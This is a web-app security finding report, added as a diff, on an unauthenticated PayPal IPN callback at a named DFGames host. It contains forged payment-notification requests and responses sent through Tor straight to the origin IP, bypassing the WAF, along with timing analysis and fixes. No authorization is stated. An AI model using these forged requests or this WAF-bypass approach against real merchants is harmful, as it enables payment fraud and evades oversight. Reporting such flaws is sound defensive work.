@@ -1,0 +1,131 @@
+# F-W3 — Unauthenticated PayPal IPN endpoint accepting arbitrary POST (payment forgery candidate)
+# webapp finding | old.dfg.com.br (161.97.106.114)
+
+## Severity: MEDIUM-HIGH (exposure confirmed; VERIFIED-check absence strongly indicated, not 100% proven non-destructively)
+## CVSS: 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N) — integrity of payment state (if business logic runs on forged IPN)
+## OWASP: A01:2021 Broken Access Control (unauthenticated financial callback) / A07 Identification & Auth Failures
+
+## Target
+- URL: https://161.97.106.114/ipn.aspx (Host: old.dfg.com.br) — direct origin IP, NO WAF (Cloudflare bypassed)
+- Stack: ASP.NET WebForms, IIS/10.0, ASP.NET 4.0.30319 (legacy DFGames admin host)
+- The endpoint is the PayPal Instant Payment Notification (IPN) callback for the DFGames marketplace.
+
+## Description
+`/ipn.aspx` is an unauthenticated PayPal IPN receiver that accepts ANY POST — including pure
+garbage, XML, and forged PayPal notifications with a fake `txn_id`, a `receiver_email` that does
+NOT belong to DFGames, and `mc_gross=0.01` — and returns `HTTP 200` with an empty body for ALL of
+them, with NO response differentiation and NO visible validation/verification step.
+
+Per the PayPal IPN protocol, a correctly-implemented receiver must:
+1. Read the POST, append `cmd=_notify-validate`, and POST it back to `https://www.paypal.com/cgi-bin/webscr`.
+2. Only execute business logic (mark order paid, credit account) if PayPal replies `VERIFIED`.
+3. Ignore/log the notification if PayPal replies `INVALID`.
+
+The observed behaviour (200 OK empty for ALL inputs including malformed garbage and a forged
+notification with a wrong `receiver_email` that PayPal would NEVER verify) strongly indicates the
+handler does NOT perform the PayPal VERIFIED roundtrip and/or does not validate the IPN structure
+before accepting it. A verifying handler would, at minimum, require the standard IPN fields and
+would behave differently for a structurally-invalid/garbage payload; here garbage returns the
+identical 200 empty response as a full forged notification.
+
+Timing measurement (via Tor, calibrated against /login.aspx on the same host as the no-outbound
+baseline) shows `/ipn.aspx` is only ~0.2s slower than `/login.aspx` — consistent with no
+synchronous outbound HTTPS roundtrip to PayPal (a real PayPal verification would add ~0.3-1.5s on
+top of the server's own latency). This is a weak/secondary indicator.
+
+## Non-destructive confirmation (NO real account/balance affected)
+All test payloads use a FAKE `txn_id` (`WEBAPP_FAKE_NONDESTRUCTIVE_*`), a `receiver_email` that is
+NOT DFGames' real PayPal address (`test-not-real@example.com`), `mc_gross=0.01`, and a
+`custom=TESTE_WEBAPP_NONDESTRUCTIVE` marker. No real PayPal payment was sent; no real DFGames
+account was credited (the forged notification would be INVALID at PayPal, so a verifying handler
+would discard it). No duplicate `txn_id` was sent (to avoid creating duplicate records).
+
+### Reproduction (via Tor socks5h, exit 104.244.72.115)
+
+#### Test 1 — full forged IPN (fake txn_id, wrong receiver_email)
+```
+POST /ipn.aspx HTTP/2
+Host: old.dfg.com.br
+Content-Type: application/x-www-form-urlencoded
+
+payment_status=Completed&mc_gross=0.01&mc_currency=USD&txn_id=WEBAPP_FAKE_NONDESTRUCTIVE_0001
+&receiver_email=test-not-real@example.com&payer_email=attacker@example.com
+&item_name=TEST&custom=TESTE_WEBAPP_NONDESTRUCTIVE&txn_type=web_accept
+&verify_sign=FakeVerifySignNotReal0000&charset=utf-8
+```
+Response (3 runs):
+```
+HTTP/2 200
+content-type: text/html
+content-length: 0
+set-cookie: ASP.NET_SessionId=... (fresh each time)
+(body empty)
+```
+Timing: 1.99s / 1.86s / 1.61s.
+
+#### Test 2 — pure garbage (no IPN fields at all)
+```
+POST /ipn.aspx  body: garbage=1&notanipn=yes
+```
+Response: `HTTP/2 200, content-length: 0, body empty` (IDENTICAL to Test 1).
+→ No structural validation: the handler does not even require the standard IPN fields.
+
+#### Test 3 — cmd=_notify-validate injected in the attacker POST (handler-confusion probe)
+```
+POST /ipn.aspx  body: cmd=_notify-validate&payment_status=Completed&mc_gross=0.01&txn_id=...&custom=TESTE
+```
+Response: `HTTP/2 200, content-length: 0, body empty` (no reflection/echo).
+
+#### Test 4 — XML content-type (PayPal IPN is always form-urlencoded)
+```
+POST /ipn.aspx  Content-Type: application/xml  body: <notify><payment_status>Completed</payment_status></notify>
+```
+Response: `HTTP/2 200, content-length: 0, body empty`.
+→ Handler accepts non-IPN content types without validation.
+
+### Timing calibration
+| Endpoint | runs (time_total via Tor) | notes |
+|---|---|---|
+| /login.aspx GET (no outbound) | 2.08s / 2.02s / 2.04s | baseline Tor+IIS |
+| /ipn.aspx POST fake IPN       | 2.28s / 2.13s / 2.38s | +0.1-0.3s over baseline |
+connect time ~0.0002s (local Tor proxy); ttfb ≈ total (server responds at end). The ~2s is
+dominated by the Tor circuit, not server processing. The small delta is consistent with no
+synchronous PayPal roundtrip.
+
+## Impact
+- **Integrity (payment state):** If the handler executes business logic on the forged POST without
+  the VERIFIED check, an attacker can mark arbitrary orders as paid / credit accounts / trigger
+  fulfillment without sending real money (payment forgery). A `custom` field typically carries the
+  internal order/customer id, so the attacker can target a specific order.
+- **Confidentiality:** none observed.
+- **Availability:** none observed (no DoS performed).
+- The endpoint is reachable WITHOUT authentication and WITHOUT passing through Cloudflare's WAF
+  (direct origin IP), so an attacker bypasses any edge protections.
+
+## Limitation (honest caveat)
+A 200 response alone does not prove business logic executed — a verifying handler also returns 200
+(to stop PayPal retries) after discarding INVALID notifications. Definitive proof that the handler
+processes the forged IPN (creates a paid order/credit) would require observing a state change on a
+real or test order, which was NOT done (non-destructive constraint). The strong indicators here are:
+(a) the handler accepts pure garbage / XML with the identical 200 response (no structural validation),
+(b) it accepts a forged `receiver_email` that PayPal would never VERIFIED with no differentiation,
+(c) timing shows no meaningful PayPal roundtrip. Combined, these strongly suggest missing VERIFIED
+  validation. Full confirmation requires a controlled test order (with DFGames consent) or source review.
+
+## Recommendation
+- Implement the PayPal VERIFIED roundtrip: read POST → append `cmd=_notify-validate` → POST back to
+  `https://www.paypal.com/cgi-bin/webscr` → only proceed if response == `VERIFIED`.
+- Reject/ignore notifications whose `receiver_email` is not DFGames' registered PayPal address.
+- Validate IPN structure (require `txn_id`, `payment_status`, `mc_gross`, `receiver_email`) and
+  return 400 for malformed requests (instead of 200 for garbage).
+- Deduplicate by `txn_id` (reject already-processed txn_ids).
+- Verify the payment amount (`mc_gross`) and currency match the stored order before crediting.
+- Require the callback to come from PayPal's IP ranges OR place the endpoint behind auth/internal
+  network (currently it is exposed unauthenticated on the origin IP without WAF).
+- Move behind Cloudflare / restrict by IP allowlist.
+
+## Timestamp (via Tor)
+- Captured 2026-09-05T00:33Z UTC (Tor exit 104.244.72.115); server date 2026-09-05T00:33:20Z.
+
+## Evidence artifacts
+- webapp/g1.txt (GET), webapp/g2.txt (POST empty), webapp/g3.txt + b3_*.txt (fake IPN), webapp/d1.txt+bd1.txt (garbage), webapp/d2.txt+bd2.txt (cmd inject), webapp/d3.txt+bd3.txt (XML)
